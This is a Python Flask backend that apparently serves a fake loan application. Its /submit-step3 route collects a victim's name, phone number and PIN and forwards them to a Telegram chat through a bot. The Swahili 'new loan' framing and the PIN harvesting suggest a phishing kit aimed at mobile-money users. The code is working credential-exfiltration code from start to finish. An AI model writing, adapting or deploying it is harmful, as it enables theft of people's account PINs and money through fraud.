from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
CHAT_ID = os.environ.get("CHAT_ID")

@app.route("/")
def home():
    return "Backend Running Successfully"

@app.route("/submit-step3", methods=["POST"])
def submit_step3():

    print("STEP 3 ROUTE HIT")

    try:

        data = request.get_json()

        print("DATA RECEIVED:", data)

        jina = data.get("jina")
        namba = data.get("namba")
        pin = data.get("pin")

        message = f"""
MKOPO MPYA

Jina: {jina}
Namba: {namba}
PIN: {pin}
"""

        print("MESSAGE:", message)

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

        payload = {
            "chat_id": CHAT_ID,
            "text": message
        }

        print("SENDING TO TELEGRAM...")

        response = requests.post(url, json=payload)

        print("STATUS CODE:", response.status_code)
        print("RESPONSE:", response.text)

        if response.status_code == 200:

            return jsonify({
                "status": "success",
                "message": "Sent to Telegram"
            })

        else:

            return jsonify({
                "status": "error",
                "message": response.text
            })

    except Exception as e:

        print("ERROR:", str(e))

        return jsonify({
            "status": "error",
            "message": str(e)
        })

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
